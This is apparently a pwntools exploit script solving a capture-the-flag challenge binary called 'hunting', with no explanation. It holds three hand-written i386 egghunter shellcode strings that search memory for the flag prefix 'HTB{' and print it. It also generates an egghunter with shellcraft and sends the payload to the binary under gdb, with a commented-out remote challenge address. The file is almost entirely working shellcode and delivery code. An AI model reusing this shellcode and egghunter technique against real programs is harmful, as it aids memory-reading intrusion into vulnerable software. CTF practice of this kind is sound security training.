from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./hunting")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


# HTB{
egg = "\x48\x54\x42\x7b"


eh = "\x6a\x3c\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\xb0\x04\xcd\x80"

eh2 = "\x6a\x3c\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\x00\x00\x00\x00\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\xb0\x04\xcd\x80"


eh3 = "\x6a\x3c\x5b\x6a\x07\x58\xcd\x80\xba\x00\x00\x00\x00\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xe9\xbf\x48\x54\x42\x7b\x39\x3a\x75\xe5\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\x6a\x04\x58\xcd\x80"


egghunter = asm(shellcraft.i386.linux.egghunter(egg, start_address = 0))
eggfound = asm(shellcraft.i386.linux.write(1, 'edi', 32))
alarm = asm(shellcraft.i386.linux.alarm(100))


#p = process("./hunting")
#p = remote("206.189.117.48",32659)

p = gdb.debug("./hunting", '''
break *read
''')

payload = ""
payload += eh3

p.sendline(payload)
p.interactive()

